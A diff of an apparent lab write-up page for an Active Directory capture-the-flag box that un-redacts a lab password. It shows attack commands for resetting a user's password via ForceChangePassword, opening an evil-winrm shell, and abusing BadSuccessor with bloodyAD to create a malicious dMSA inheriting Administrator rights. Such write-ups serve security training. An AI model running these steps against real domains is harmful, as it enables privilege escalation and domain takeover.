@@ -234,11 +234,11 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
 
   <h3><span class="step">[Step 6]</span> Password Reset</h3>
   <p>Using Thor's ForceChangePassword privilege, I reset Hodr's password:</p>
-  <pre><code>$ net rpc password 'Hodr' '[REDACTED]' -U 'yggdrasil.hacksmarter'/'Thor'%'[REDACTED]' -S MidgardDC.yggdrasil.hacksmarter</code></pre>
+  <pre><code>$ net rpc password 'Hodr' 'Zerotrace123!' -U 'yggdrasil.hacksmarter'/'Thor'%'[REDACTED]' -S MidgardDC.yggdrasil.hacksmarter</code></pre>
 
   <h3><span class="step">[Step 7]</span> WinRM Shell</h3>
   <p>With the new password, I established a WinRM session as Hodr:</p>
-  <pre><code>$ evil-winrm -i 10.1.17.238 -u Hodr -p '[REDACTED]'
+  <pre><code>$ evil-winrm -i 10.1.17.238 -u Hodr -p 'Zerotrace123!'
 
 *Evil-WinRM* PS C:\Users\Hodr.YGGDRASIL\Documents></code></pre>
 
@@ -304,7 +304,7 @@ foreach ($OU in $OUs) {
 
   <h3><span class="step">[Step 11]</span> Automated Check with NetExec</h3>
   <p>NetExec has a built-in module to check for BadSuccessor vulnerability:</p>
-  <pre><code>$ nxc ldap 10.1.17.238 -u Hodr -p '[REDACTED]' -M badsuccessor</code></pre>
+  <pre><code>$ nxc ldap 10.1.17.238 -u Hodr -p 'Zerotrace123!' -M badsuccessor</code></pre>
 
   <p><img src="../assets/midgarden2/netexec-badsuccessor.png" alt="NetExec confirms BadSuccessor vulnerability" loading="lazy"></p>
 
@@ -315,7 +315,7 @@ $ source .venv/bin/activate
 $ pip install bloodyad</code></pre>
 
   <p>Then created a malicious dMSA that inherits Administrator privileges:</p>
-  <pre><code>$ bloodyAD -d yggdrasil.hacksmarter -u 'Hodr' -p '[REDACTED]' \
+  <pre><code>$ bloodyAD -d yggdrasil.hacksmarter -u 'Hodr' -p 'Zerotrace123!' \
     --host MIDGARDDC.yggdrasil.hacksmarter \
     add badSuccessor evil_dmsa1 \
     --ou 'OU=Web Servers,OU=Yggdrasil Servers,DC=yggdrasil,DC=hacksmarter'</code></pre>
